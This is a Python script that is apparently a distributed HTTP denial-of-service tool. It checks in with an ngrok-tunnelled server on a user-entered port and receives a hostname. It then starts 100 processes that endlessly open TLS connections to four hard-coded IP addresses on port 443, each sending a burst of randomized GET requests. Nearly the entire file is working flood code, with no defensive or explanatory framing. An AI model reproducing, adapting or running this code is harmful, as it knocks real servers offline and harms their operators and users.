import random
import socket
import threading
import ssl
import multiprocessing
import requests

SERVER_IP = "0.tcp.ap.ngrok.io"
SERVER_PORT = int(input("[ENTER SERVER PORT]:"))
ADDR = (SERVER_IP, SERVER_PORT)
SIZE = 1024
FORMAT = "utf-8"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ADDR))
hostname = s.recv(SIZE).decode(FORMAT)
ip = ["54.169.29.80", "3.0.13.148", "54.255.82.52", "54.254.129.122"]
s.close()
port = int(443)
protocol = str("GET")

useragents = [""]
acceptall = [""]
ref = [""]
connection = "keep-alive"
content    = "Content-Type: application/x-www-form-urlencoded\r\n"
length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
num_sent = 0
go = threading.Event()
def attack():
    global num_sent, useragents, acceptall, ref, connection, content, length
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    accept    = random.choice(acceptall)
    conn = "Connection: " + connection + "\r\n"
    go.wait()
    while True:
        c_ip = random.choice(ip)
        referer   = "Referer: " +random.choice(ref) + c_ip + "\r\n"
        get_host = protocol + " /?=" + str(random.randint(0,2000)) + " HTTP/1.1\r\nHost: " + c_ip +":"+str(port)+ "\r\n"
        request  = get_host + conn + useragent + accept + referer + content + length + "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((c_ip, port))
        num_sent = num_sent + 1
        print("[+] Sent ", num_sent, " => ", c_ip , ":", port)
        x = ssl.wrap_socket(s)
        try:
            for i in range (100):
                x.send(str.encode(request))
        except:
            x.close()

for y in range(100):
    th = multiprocessing.Process (target=attack)
    go.set()
    th.start()
